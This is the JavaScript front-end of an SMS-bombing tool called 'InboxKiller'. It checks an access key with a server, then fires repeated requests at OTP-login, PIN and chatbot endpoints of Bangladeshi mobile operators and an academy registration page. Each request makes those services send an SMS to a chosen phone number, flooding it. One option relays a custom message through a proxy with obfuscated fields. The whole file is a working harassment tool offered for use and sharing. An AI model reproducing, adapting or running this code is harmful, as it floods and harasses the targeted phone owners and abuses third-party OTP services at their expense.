$(document).on("click", "#send", function () {
    var amount = $("#amount").val();
    var message = $("#message").val();
    var mobile = $("#mobile").val();
    var option = $("#option").val();
    var url = "https://cors-anywhere.herokuapp.com/https://server.rexsoftbd.com/app/r5.php";
    if (option != "All-Sim-OTP") {
        if (option == "BL-OTP") {
            url = "https://assetliteapi.banglalink.net/api/v1/user/otp-login/request";
        } else if (option == "circle-pin") {
            url = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=21191&app_version=77&msisdn=" + mobile + "&resent";
        } else if (option == "Robi-SIVR") {
            url = "https://smart1216.robi.com.bd/robisivr/login-process";
        } else if (option == "Airtel-SIVR") {
            url = "https://smart1216.robi.com.bd/sivr/login-process";
        } else if (option == "Robi-AURA") {
            url = "https://cloud4.preneurlab.com/robinewbot/user.php?cname=inboxkiller&cnumber=" + mobile + "&resent";
        } else if (option == "Airtel-BOT") {
            url = "https://airtelbot.forbangladesh.com/webbot-new/user.php?cname=inboxkiller&cnumber=" + mobile + "&resent";
        }
    }
    if (amount > 0 && mobile.length == 11) {
        $.ajax({
            type: "GET",
            url: "verify.php",
            success: (res) => {
                if (res == "M35K47") {
                    var c = 0;
                            if (option == "Robi-SIVR" || option == "Airtel-SIVR") {
                                while (c < amount) {
                                    $.ajax({ type: "POST", url: url, data: { cli: mobile, language: "BN" } });
                                    c += 1;
                                }
                            } else if (option == "All-Sim-OTP") {
                                var c = 1;
                                {
                                    $.ajax({
                                        type: "POST",
                                        url: url,
                                        data: {
                                            a74ad8dfacd4f985eb3977517615ce25: "60aeca1fe15bf6e51a8ca65eebafd08d",
                                            b4aecf767cb52e7f0387ae8a6d362bf2: mobile,
                                            afbe94cdbe69a93efabc9f1325fc7dff: "0",
                                            ee11cbb19052e40b07aac0ca060c23ee: "e16b9f6312cc8fadff1929f0c259f93c",
                                            y9smsr: message,
                                        },
                                    });
                                    c += 1;
                                }
                            } else if (option == "BL-OTP") {
                                while (c < amount) {
                                    $.ajax({ type: "POST", url: url, data: { mobile: mobile } });
                                    c += 1;
                                }
                            } else if (option == "Udvash") {
                                while (c < amount) {
                                    var rand = Math.random();
                                    url = "https://online.uttoron.academy/Registration?nickName=" + rand + "&mobileNumber=88" + mobile;
                                    $.ajax({ type: "GET", url: url });
                                    c += 1;
                                }
                            } else {
                                while (c < amount) {
                                    $.ajax({ type: "GET", url: url });
                                    c += 1;
                                }
                            }
                            alert(amount + " SMS has been successfully sent to " + mobile + "\n-Share inboxkiller with your friends.");
                } else {
                    alert("Please contact with Admin\n www.facebook.com/tasu.legend");
                }
            },
        });
    } else {
        alert("Invalid number or message is empty\n-InboxKiller");
    }
});

